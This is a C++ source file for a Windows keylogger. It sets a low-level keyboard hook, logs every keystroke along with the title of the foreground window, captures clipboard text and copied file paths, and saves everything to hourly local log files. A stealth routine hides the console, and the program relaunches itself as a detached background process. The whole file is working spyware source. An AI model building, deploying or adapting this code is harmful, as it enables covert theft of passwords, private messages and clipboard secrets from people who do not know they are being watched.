#define UNICODE
#include <Windows.h>
#include <Shellapi.h>
#include <cstring>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <string>
#include <time.h>
#include <map>
#include <vector>

#pragma comment(lib, "Shell32.lib")

// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define invisible // (visible / invisible)
// Defines whether you want to enable or disable 
// boot time waiting if running at system boot.
#define bootwait // (bootwait / nowait)
// defines which format to use for logging
// 0 for default, 10 for dec codes, 16 for hex codex
#define FORMAT 0
// defines if ignore mouseclicks
#define mouseignore
// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.

#if FORMAT == 0
const std::map<int, std::string> keyname{
	{VK_BACK, "[BACKSPACE]" },
    {VK_DELETE, "[DEL]"},
	{VK_RETURN,	"\n" },
	{VK_SPACE,	"[SPACE]" },
	{VK_TAB,	"[TAB]" },
	{VK_SHIFT,	"[SHIFT]" },
	{VK_LSHIFT,	"[LSHIFT]" },
	{VK_RSHIFT,	"[RSHIFT]" },
	{VK_CONTROL,	"[CONTROL]" },
	{VK_LCONTROL,	"[LCONTROL]" },
	{VK_RCONTROL,	"[RCONTROL]" },
	{VK_MENU,	"[ALT]" },
	{VK_LWIN,	"[LWIN]" },
	{VK_RWIN,	"[RWIN]" },
	{VK_ESCAPE,	"[ESCAPE]" },
	{VK_END,	"[END]" },
	{VK_HOME,	"[HOME]" },
	{VK_LEFT,	"[LEFT]" },
	{VK_RIGHT,	"[RIGHT]" },
	{VK_UP,		"[UP]" },
	{VK_DOWN,	"[DOWN]" },
	{VK_PRIOR,	"[PG_UP]" },
	{VK_NEXT,	"[PG_DOWN]" },
	{VK_OEM_PERIOD,	"." },
	{VK_DECIMAL,	"." },
	{VK_OEM_PLUS,	"+" },
	{VK_OEM_MINUS,	"-" },
	{VK_ADD,		"+" },
	{VK_SUBTRACT,	"-" },
	{VK_CAPITAL,	"[CAPSLOCK]" },
	{VK_F1,     "[F1]"},
	{VK_F2,     "[F2]"},
	{VK_F3,     "[F3]"},
	{VK_F4,     "[F4]"},
	{VK_F5,     "[F5]"},
	{VK_F6,     "[F6]"},
	{VK_F7,     "[F7]"},
	{VK_F8,     "[F8]"},
	{VK_F9,     "[F9]"},
	{VK_F10,    "[F10]"},
	{VK_F11,    "[F11]"},
	{VK_F12,    "[F12]"},
};
#endif
HHOOK _hook;
HWND clipboard_window = NULL;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream output_file;

char output_filename[32];
int cur_hour = -1;
ULONGLONG last_log_activity = 0;
ULONGLONG next_log_retry = 0;
bool log_retry_pending = false;
const ULONGLONG log_idle_timeout_ms = 60 * 1000;

bool EnsureLogDirectory()
{
	return CreateDirectoryA("logs", NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
}

bool OpenLogFile()
{
	if (!EnsureLogDirectory())
	{
		log_retry_pending = true;
		next_log_retry = GetTickCount64() + log_idle_timeout_ms;
		return false;
	}

	output_file.clear();
	output_file.open(output_filename, std::ios_base::app);
	if (!output_file.is_open())
	{
		log_retry_pending = true;
		next_log_retry = GetTickCount64() + log_idle_timeout_ms;
		return false;
	}

	log_retry_pending = false;
	last_log_activity = GetTickCount64();
	return true;
}

void CloseIdleLog()
{
	const ULONGLONG now = GetTickCount64();
	if (log_retry_pending && now >= next_log_retry)
	{
		OpenLogFile();
	}
	else if (output_file.is_open() && now - last_log_activity >= log_idle_timeout_ms)
	{
		output_file.close();
	}
}

bool StartBackgroundProcess()
{
	wchar_t executable_path[MAX_PATH];
	if (GetModuleFileNameW(NULL, executable_path, MAX_PATH) == 0)
	{
		return false;
	}

	std::wstring command_line = L"\"" + std::wstring(executable_path) + L"\" --background-worker";
	STARTUPINFOW startup_info = {};
	startup_info.cb = sizeof(startup_info);
	PROCESS_INFORMATION process_info = {};

	if (!CreateProcessW(NULL, &command_line[0], NULL, NULL, FALSE,
		DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP, NULL, NULL, &startup_info, &process_info))
	{
		return false;
	}

	CloseHandle(process_info.hThread);
	CloseHandle(process_info.hProcess);
	return true;
}

// This is the callback function. Consider it the event that is raised when, in this case,
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			// save to file
			Save(kbdStruct.vkCode);
		}
	}

	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		LPCWSTR a = L"Failed to install hook!";
		LPCWSTR b = L"Error";
		MessageBox(NULL, a, b, MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}

int WriteLog(const std::string& content)
{
	struct tm tm_info;
	const time_t t = time(NULL);
	localtime_s(&tm_info, &t);

	// Determine current hour and base log file on that to avoid a massive single log file.
	if (cur_hour != tm_info.tm_hour)
	{
		output_file.close();
		cur_hour = tm_info.tm_hour;
		strftime(output_filename, sizeof(output_filename), "logs/%Y-%m-%d__%H-%M-%S.log", &tm_info);
	}

	if (!output_file.is_open())
	{
		if (log_retry_pending && GetTickCount64() < next_log_retry)
		{
			return 0;
		}
		if (!OpenLogFile())
		{
			return 0;
		}
		std::cout << "Logging output to " << output_filename << std::endl;
	}

	output_file << content;
	output_file.flush();
	last_log_activity = GetTickCount64();
	std::cout << content;
	return 0;
}

std::string WideToUtf8(const std::wstring& text)
{
	if (text.empty())
	{
		return "";
	}

	int size = WideCharToMultiByte(CP_UTF8, 0, text.data(), static_cast<int>(text.size()),
		NULL, 0, NULL, NULL);
	if (size <= 0)
	{
		return "";
	}

	std::string result(size, '\0');
	WideCharToMultiByte(CP_UTF8, 0, text.data(), static_cast<int>(text.size()),
		&result[0], size, NULL, NULL);
	return result;
}

void SaveClipboard()
{
	if (!OpenClipboard(clipboard_window))
	{
		return;
	}

	std::string clipboard_log;
	if (IsClipboardFormatAvailable(CF_UNICODETEXT))
	{
		HANDLE clipboard_data = GetClipboardData(CF_UNICODETEXT);
		if (clipboard_data)
		{
			const wchar_t* text = static_cast<const wchar_t*>(GlobalLock(clipboard_data));
			if (text)
			{
				std::string utf8_text = WideToUtf8(text);
				GlobalUnlock(clipboard_data);
				if (!utf8_text.empty())
				{
					clipboard_log = "\n\n[Clipboard text] " + utf8_text;
				}
			}
		}
	}
	else if (IsClipboardFormatAvailable(CF_HDROP))
	{
		HDROP drop = static_cast<HDROP>(GetClipboardData(CF_HDROP));
		if (drop)
		{
			UINT file_count = DragQueryFileW(drop, 0xFFFFFFFF, NULL, 0);
			for (UINT i = 0; i < file_count; ++i)
			{
				UINT length = DragQueryFileW(drop, i, NULL, 0);
				std::vector<wchar_t> path(length + 1, L'\0');
				DragQueryFileW(drop, i, path.data(), length + 1);
				clipboard_log += "\n" + WideToUtf8(path.data());
			}
			if (!clipboard_log.empty())
			{
				clipboard_log = "\n\n[Clipboard files]" + clipboard_log;
			}
		}
	}

	CloseClipboard();
	if (!clipboard_log.empty())
	{
		WriteLog(clipboard_log);
	}
}

LRESULT CALLBACK ClipboardWindowProc(HWND window, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_CLIPBOARDUPDATE:
		SaveClipboard();
		return 0;
	case WM_DESTROY:
		RemoveClipboardFormatListener(window);
		return 0;
	default:
		return DefWindowProc(window, message, wParam, lParam);
	}
}

bool StartClipboardListener()
{
	const wchar_t* class_name = L"KeyloggerClipboardListener";
	WNDCLASSW window_class = {};
	window_class.lpfnWndProc = ClipboardWindowProc;
	window_class.hInstance = GetModuleHandleW(NULL);
	window_class.lpszClassName = class_name;

	if (!RegisterClassW(&window_class) && GetLastError() != ERROR_CLASS_ALREADY_EXISTS)
	{
		return false;
	}

	clipboard_window = CreateWindowExW(0, class_name, L"", 0,
		0, 0, 0, 0, HWND_MESSAGE, NULL, window_class.hInstance, NULL);
	if (!clipboard_window)
	{
		return false;
	}

	if (!AddClipboardFormatListener(clipboard_window))
	{
		DestroyWindow(clipboard_window);
		clipboard_window = NULL;
		return false;
	}
	return true;
}

void StopClipboardListener()
{
	if (clipboard_window)
	{
		DestroyWindow(clipboard_window);
		clipboard_window = NULL;
	}
}

int Save(int key_stroke)
{
	std::stringstream output;
	static char lastwindow[256] = "";
#ifndef mouseignore 
	if ((key_stroke == 1) || (key_stroke == 2))
	{
		return 0; // ignore mouse clicks
	}
#endif
	HWND foreground = GetForegroundWindow();
	DWORD threadID;
	HKL layout = NULL;

	// get time
	struct tm tm_info;
	const time_t t = time(NULL);
	localtime_s(&tm_info, &t);

	if (foreground)
	{
		// get keyboard layout of the thread
		threadID = GetWindowThreadProcessId(foreground, NULL);
		layout = GetKeyboardLayout(threadID);
	}

	if (foreground)
	{
		char window_title[256];
		GetWindowTextA(foreground, (LPSTR)window_title, 256);

		if (strcmp(window_title, lastwindow) != 0)
		{
			strcpy_s(lastwindow, sizeof(lastwindow), window_title);
			char s[64];
			strftime(s, sizeof(s), "%Y-%m-%dT%X", &tm_info);
			output << "\n\n[Window: " << window_title << " - at " << s << "] ";
		}
	}

#if FORMAT == 10
	output << '[' << key_stroke << ']';
#elif FORMAT == 16
	output << std::hex << "[" << key_stroke << ']';
#else
	if (keyname.find(key_stroke) != keyname.end())
	{
		output << keyname.at(key_stroke);
	}
	else
	{
		char key;
		// check caps lock
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		// check shift key
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
			|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
		{
			lowercase = !lowercase;
		}

		// map virtual key according to keyboard layout
		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

		// tolower converts it to lowercase properly
		if (!lowercase)
		{
			key = tolower(key);
		}
		output << char(key);
	}
#endif
	return WriteLog(output.str());
}

void Stealth()
{
#ifdef visible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif

#ifdef invisible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
	FreeConsole(); // Detaches the process from the console window. This effectively hides the console window and fixes the broken invisible define.
#endif
}

// Function to check if the system is still booting up
bool IsSystemBooting()
{
	// A workaround fix for missing definition of SM_SYSTEMDOCKED
	//	return GetSystemMetrics(0x2004) != 0;
	return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
}

int main(int argc, char* argv[])
{
	// The launcher exits immediately; the detached child runs without a console.
	if (argc < 2 || strcmp(argv[1], "--background-worker") != 0)
	{
		if (!StartBackgroundProcess())
		{
			std::cerr << "Failed to start background process. Error: " << GetLastError() << std::endl;
			return 1;
		}
		return 0;
	}

	// Call the visibility of window function.
	Stealth();

	// Check if the system is still booting up
#ifdef bootwait // If defined at the top of this file, wait for boot metrics.
	while (IsSystemBooting())
	{
		std::cout << "System is still booting up. Waiting 10 seconds to check again...\n";
		Sleep(10000); // Wait for 10 seconds before checking again
	}
#endif
#ifdef nowait // If defined at the top of this file, do not wait for boot metrics.
	std::cout << "Skipping boot metrics check.\n";
#endif

	// This part of the program is reached once the system has 
	// finished booting up aka when the while loop is broken 
	// with the correct returned value.

	// Call the hook function and set the hook.
	SetHook();
	StartClipboardListener();

	// Keep processing hook and clipboard messages while checking the log idle timeout once per second.
	while (true)
	{
		DWORD wait_result = MsgWaitForMultipleObjects(0, NULL, FALSE, 1000, QS_ALLINPUT);
		if (wait_result == WAIT_OBJECT_0)
		{
			MSG msg;
			while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE))
			{
				if (msg.message == WM_QUIT)
				{
					ReleaseHook();
					StopClipboardListener();
					output_file.close();
					return 0;
				}
				TranslateMessage(&msg);
				DispatchMessage(&msg);
			}
		}
		else if (wait_result == WAIT_FAILED)
		{
			ReleaseHook();
			StopClipboardListener();
			output_file.close();
			return 1;
		}

		CloseIdleLog();
	}
}